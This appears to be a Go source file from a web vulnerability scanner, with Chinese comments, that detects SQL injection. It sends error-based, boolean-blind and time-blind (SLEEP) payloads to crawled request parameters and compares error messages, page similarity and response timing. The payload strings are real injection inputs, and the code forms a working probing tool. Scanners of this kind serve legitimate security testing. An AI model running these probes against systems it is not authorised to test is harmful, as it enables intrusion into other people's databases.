package sqli

import (
	"AutoScan/pkg/spider"
	"AutoScan/pkg/utils"
	"fmt"
	"github.com/agnivade/levenshtein"
	"github.com/go-resty/resty/v2"
	"github.com/jinzhu/copier"
	"gonum.org/v1/gonum/stat"
	"math"
	"regexp"
	"sort"
	"strconv"
	"sync"
)

// ERRORDIR 触发SQL错误的字符
var ERRORDIR = []string{
	"'",
	"\"",
	"\\",
	"%BF",
}

const (
	SIMILARITY       = 0.99999
	DefaultParam     = "1"
	TimeRequestTimes = 30
	MaxGoroutines    = 10
)

// BOOLNUMDIR BOOL数字盲注
var BOOLNUMDIR = map[string]string{
	"true1":  " OR 2025=2025 LIMIT 1 -- ",
	"true2":  " OR 2021=2021 LIMIT 1 -- ",
	"false1": " AND 2021=2025",
	"false2": " AND 21=25",
}

// BOOLCHAR BOOL字符盲注
var BOOLCHAR = map[string]string{
	"true1":  "' OR 2025=2025 LIMIT 1 -- ",
	"true2":  "' OR 2021=2021 LIMIT 1 -- ",
	"false1": "' AND 2021=2025 LIMIT 1 -- ",
	"false2": "' AND 21=25 LIMIT 1 -- ",
}

// TIMEDIR TIME盲注
var TIMEDIR = map[string]string{
	"true1": "' AND (SELECT 2025 FROM (SELECT(SLEEP(5)))CQUPT) AND 'CQUPT'='CQUPT",
	"true2": "' AND (SELECT 2021 FROM (SELECT(SLEEP(4)))CQUPT) AND 'cqupt'='cqupt",
	"false": "' AND (SELECT 2025 FROM (SELECT(SLEEP(0)))CQUPT) AND 'CQUPT'='CQUPT",
}

// 检测SQL错误的正则表达式
var regexPatterns = []*regexp.Regexp{
	// 5. SQL 语法错误
	regexp.MustCompile(`(?i)([^\n>]{0,100}SQL Syntax[^\n<]+)`),

	// 11. 查询错误
	regexp.MustCompile(`(?i)(query error: )`),
}

type SqlResult struct {
	URL         string
	Method      string
	Params      map[string][]string
	RequestType string
	IsSqli      bool
	SqlParams   string
	Note        string
}

// TimeSqlInfo 时间盲注结构体
type TimeSqlInfo struct {
	Average   float64
	Deviation float64
}

var client = utils.Client{}

func init() {
	client.InitClient()
}

// RunSqlScan 启动SQL注入扫描
func RunSqlScan(rawData []Spider.RequestInfo) []SqlResult {
	var data []*SqlResult
	wg := sync.WaitGroup{}
	// 用信号量来控制并发数量
	sem := make(chan struct{}, MaxGoroutines)
	defer close(sem)
	// 并发测试
	for _, info := range rawData {
		sem <- struct{}{}

		result := &SqlResult{
			URL:         info.URL,
			Method:      info.Method,
			Params:      info.Params,
			RequestType: info.RequestType,
		}
		go func(spiderInfo Spider.RequestInfo) {
			wg.Add(1)
			defer wg.Done()
			result.TestSqli(spiderInfo)
			<-sem
		}(info)
		data = append(data, result)
	}
	wg.Wait()
	fmt.Println("sql注入测试完毕")
	var results []SqlResult
	for _, i := range data {
		results = append(results, *i)
	}
	return results
}

// TestSqli 单个请求验证的核心函数
func (s *SqlResult) TestSqli(info Spider.RequestInfo) {
	if res, target := ErrorSqli(info); res {
		s.IsSqli = true
		s.Note = "ErrorSqli"
		s.SqlParams = target
		return
	}
	if res, target := BoolSqli(info); res {
		s.IsSqli = true
		s.Note = "BoolSqli"
		s.SqlParams = target
		return
	}
	if res, target := TimeSqli(info); res {
		s.IsSqli = true
		s.Note = "TimeSqli"
		s.SqlParams = target
		return
	}
	s.IsSqli = false
	s.Note = "NoSqli"
	return
}

// ErrorSqli 判断回显是否为SQL报错
func ErrorSqli(info Spider.RequestInfo) (bool, string) {
	//var resp *resty.Response
	for i := range info.Params {
		for _, j := range ERRORDIR {
			// 发送请求
			copyMap := utils.GetParams(info)
			copyMap[i] = copyMap[i] + j
			resp, err := client.Request(info.URL, info.Method, copyMap, info.RequestType)
			if err != nil {
				fmt.Println("ErrorSqli request Error:", err)
				return false, i
			}
			if CheckError(resp) {
				return true, i
			}
		}
	}

	return false, ""
}

// BoolSqli 布尔盲注检测
func BoolSqli(info Spider.RequestInfo) (bool, string) {
	// 遍历参数,并设置默认值
	for param := range info.Params {
		if len(info.Params[param]) == 0 || info.Params[param][0] == "" {
			info.Params[param] = []string{DefaultParam}
		}
	}
	for i := range info.Params {
		_, err := strconv.Atoi(info.Params[i][0])
		if err != nil {
			// 字符型
			if OnceBoolSqli(info, i, true) {
				return true, i
			}
		} else {
			// 数字型
			if OnceBoolSqli(info, i, false) {
				return true, i
			}
			if OnceBoolSqli(info, i, true) {
				return true, i
			}
		}
	}
	return false, ""
}

// OnceBoolSqli 数字bool和字符bool的执行函数
func OnceBoolSqli(info Spider.RequestInfo, target string, str bool) bool {
	payload := BOOLNUMDIR
	if str {
		payload = BOOLCHAR
	}
	newParams := utils.GetParams(info)
	true1 := make(map[string]string)
	true2 := make(map[string]string)
	false1 := make(map[string]string)
	false2 := make(map[string]string)
	err := copier.Copy(&true1, &newParams)
	err1 := copier.Copy(&true2, &newParams)
	err2 := copier.Copy(&false1, &newParams)
	err3 := copier.Copy(&false2, &newParams)
	if err != nil || err1 != nil || err2 != nil || err3 != nil {
		fmt.Println("OnceBoolSqli copy error:", err, err1, err2, err3)
		return false
	}
	true1[target] = true1[target] + payload["true1"]
	true2[target] = true2[target] + payload["true2"]
	false1[target] = false1[target] + payload["false1"]
	false2[target] = false2[target] + payload["false2"]
	// 发送请求
	originResp, err := client.Request(info.URL, info.Method, newParams, info.RequestType)
	if err != nil {
		fmt.Println("BoolSqli origin request Error:", err)
		return false
	}
	False1Resp, err := client.Request(info.URL, info.Method, false1, info.RequestType)
	if err != nil {
		fmt.Println("BoolSqli false1 request Error:", err)
		return false
	}

	True1resp, err := client.Request(info.URL, info.Method, true1, info.RequestType)
	if err != nil {
		fmt.Println("BoolSqli true1 request Error:", err)
		return false
	}

	// 计算三者的相似度
	True1AndOrigin := CheckBool(True1resp, originResp)
	False1AndOrigin := CheckBool(False1Resp, originResp)
	True1AndFalse1 := CheckBool(True1resp, False1Resp)
	// 如果三者相同，则表示不是漏洞
	if (True1AndOrigin && False1AndOrigin) || True1AndFalse1 {
		return false
	}
	// 如果三者都不同，则需要进一步验证
	if !True1AndOrigin && !False1AndOrigin {
		// 如果true1和tru2相同，则表示是漏洞，并且false1和false2也相同
		True2resp, err := client.Request(info.URL, info.Method, true2, info.RequestType)
		if err != nil {
			fmt.Println("BoolSqli true2 request Error:", err)
			return false
		}
		False2resp, err := client.Request(info.URL, info.Method, false2, info.RequestType)
		if err != nil {
			fmt.Println("BoolSqli false2 request Error:", err)
			return false
		}
		if CheckBool(True2resp, True1resp) && CheckBool(False2resp, False1Resp) {
			return true
		}
		return false
	}
	// 如果True1和原始页面相同，False1和原始页面不同
	if True1AndOrigin && !False1AndOrigin {
		// 如果True2和原始页面相同，则表示是漏洞
		True2resp, err := client.Request(info.URL, info.Method, true2, info.RequestType)
		if err != nil {
			fmt.Println("BoolSqli true2 request Error:", err)
			return false
		}
		if CheckBool(True2resp, originResp) {
			return true
		}
		return false
	}
	// 如果False1和原始页面相同，True1和原始页面不同
	if !True1AndOrigin && False1AndOrigin {
		// 如果False2和原始页面相同，则表示是漏洞
		False2resp, err := client.Request(info.URL, info.Method, false2, info.RequestType)
		if err != nil {

			fmt.Println("BoolSqli false2 request Error:", err)
			return false
		}
		if CheckBool(False2resp, originResp) {
			return true
		}
		return false
	}
	fmt.Println("bool注入其他情况出现")
	fmt.Println("URL:", info.URL)
	fmt.Println("Method:", info.Method)
	fmt.Println("Params:", info.Params)
	fmt.Println("RequestType:", info.RequestType)
	fmt.Println("True1AndOrigin:", True1AndOrigin)
	fmt.Println("False1AndOrigin:", False1AndOrigin)
	fmt.Println("True1AndFalse1:", True1AndFalse1)
	fmt.Println("True1resp:", True1resp.String())
	return false

}

// TimeSqli 时间盲注
func TimeSqli(info Spider.RequestInfo) (bool, string) {
	// 遍历参数,并设置默认值
	for param := range info.Params {
		if len(info.Params[param]) == 0 || info.Params[param][0] == "" {
			info.Params[param] = []string{DefaultParam}
		}
	}
	timeInfo := TimeSqlInfo{}
	timeInfo.CalcTime(info)
	for i := range info.Params {
		if timeInfo.OnceTimeSqli(info, i) {
			return true, i
		}
	}
	return false, ""

}

// CheckError 检查是否含有SQL注入的错误信息
func CheckError(resp *resty.Response) bool {
	for _, pattern := range regexPatterns {
		// 检查响应体是否匹配正则表达式
		if pattern.MatchString(resp.String()) {
			return true
		}
	}
	return false
}

// CheckBool 计算相似度，确定网页是否相似
func CheckBool(resp1 *resty.Response, resp2 *resty.Response) bool {
	distance := levenshtein.ComputeDistance(resp1.String(), resp2.String())
	maxLen := math.Max(float64(len(resp1.String())), float64(len(resp2.String())))
	if maxLen == 0 {
		return false
	}
	if 1-float64(distance)/maxLen > SIMILARITY {
		return true
	}
	return false

}

// OnceTimeSqli 时间盲注的核心函数
func (t *TimeSqlInfo) OnceTimeSqli(info Spider.RequestInfo, target string) bool {
	params := utils.GetParams(info)
	true1 := make(map[string]string)
	true2 := make(map[string]string)
	false1 := make(map[string]string)
	err := copier.Copy(&true1, &params)
	err1 := copier.Copy(&true2, &params)
	err2 := copier.Copy(&false1, &params)
	if err != nil || err1 != nil || err2 != nil {
		fmt.Println("OnceTimeSqli copy error:", err, err1, err2)
		return false
	}
	true1[target] = true1[target] + TIMEDIR["true1"]
	true2[target] = true2[target] + TIMEDIR["true2"]
	false1[target] = false1[target] + TIMEDIR["false"]
	//发送请求
	true1Resp, err := client.Request(info.URL, info.Method, true1, info.RequestType)
	if err != nil {
		fmt.Println("TimeSqli true1 request Error:", err)
		return false
	}
	// 如果没有发送延时，就不存在sql注入
	if !t.CheckTime(true1Resp) {
		return false
	}
	false1Resp, err := client.Request(info.URL, info.Method, false1, info.RequestType)
	if err != nil {
		fmt.Println("TimeSqli false1 request Error:", err)
		return false
	}
	// 发送延时就说明不存在sql注入
	if t.CheckTime(false1Resp) {
		return false
	}
	// 发送true2请求
	true2Resp, err := client.Request(info.URL, info.Method, true2, info.RequestType)
	if err != nil {
		fmt.Println("TimeSqli true2 request Error:", err)
		return false
	}
	// 如果没有发送延时，就不存在sql注入
	if !t.CheckTime(true2Resp) {
		return false
	}
	return true
}

// CalcTime 计算该网站的平均相应时间和标准差
func (t *TimeSqlInfo) CalcTime(info Spider.RequestInfo) {
	params := utils.GetParams(info)
	data := []float64{}
	resultChan := make(chan float64, TimeRequestTimes+2)
	// 使用semaphore限制并发数
	sem := make(chan struct{}, MaxGoroutines)
	wg := sync.WaitGroup{}
	// 需要去除最大值和最小值
	for i := 0; i < TimeRequestTimes+2; i++ {
		// 发送请求
		sem <- struct{}{}
		wg.Add(1)
		go func() {
			defer wg.Done()
			defer func() { <-sem }()
			// 发送请求
			resp, err := client.Request(info.URL, info.Method, params, info.RequestType)
			if err != nil {
				fmt.Println("TimeSqli request Error:", err)
				return
			}
			// 计算响应时间
			resultChan <- resp.Time().Seconds()
		}()
	}
	// 等待所有请求完成，关闭通道
	go func() {
		wg.Wait()
		close(resultChan)
	}()
	//通道关闭后，退出循环
	for value := range resultChan {
		data = append(data, value)
	}
	sort.Float64s(data)
	// 去除最大值和最小值
	if len(data) > 10 {
		data = data[1 : len(data)-1]
	}
	t.Average = stat.Mean(data, nil)
	t.Deviation = stat.StdDev(data, nil)
}

// CheckTime 计算当前请求是否超时
func (t *TimeSqlInfo) CheckTime(resp *resty.Response) bool {
	longtime := t.Average + t.Deviation*7
	if longtime < 0.5 {
		longtime = 0.5
	}
	ret := resp.Time().Seconds() > longtime
	return ret
}
